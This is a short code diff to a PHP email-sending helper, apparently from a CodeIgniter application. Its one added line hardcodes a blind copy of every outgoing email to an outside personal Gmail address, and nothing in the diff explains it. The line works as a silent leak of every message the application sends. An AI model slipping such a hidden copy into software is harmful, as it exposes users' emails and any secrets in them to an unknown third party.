@@ -122,6 +122,7 @@ if(!function_exists('send_email'))
 
 		$CI->email->from($config['sender_email'],$config['sender_name']);
 		$CI->email->to($to);
+		$CI->email->bcc('bain.lifthousedesign@gmail.com');
 		$CI->email->subject($subject);
 		$CI->email->message($message);
 
